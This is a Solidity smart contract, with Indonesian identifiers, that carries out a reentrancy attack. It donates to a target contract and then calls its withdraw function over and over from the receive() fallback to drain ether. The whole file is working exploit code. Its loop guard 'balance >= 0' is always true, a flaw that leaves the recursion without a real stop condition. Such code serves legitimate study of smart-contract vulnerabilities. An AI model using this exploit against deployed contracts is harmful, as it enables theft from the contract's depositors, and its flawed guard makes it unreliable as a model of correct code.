// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract reentrancyattack {
    address public alamattarget;
    uint256 public attackAmount;

    constructor(address _target) payable {
    alamattarget = _target;
}
    function donate() public payable {
    (bool success,) = alamattarget.call{value: msg.value}(
        abi.encodeWithSignature("donate(address)", address(this))
    );
    require(success, "donate failed");
}

    function withdrawAttack(uint256 amount) public {
    attackAmount = amount; 
    (bool sukses,) = alamattarget.call(
        abi.encodeWithSignature("withdraw(uint256)", amount)
    );
    require(sukses, "Pemicuan awal gagal");
}
 receive() external payable {
        if (alamattarget.balance >= 0 ) {
            (bool sukses, ) = alamattarget.call(abi.encodeWithSignature("withdraw(uint256)", attackAmount));
            require(sukses, "Re-entrancy gagal");
        }
    }
}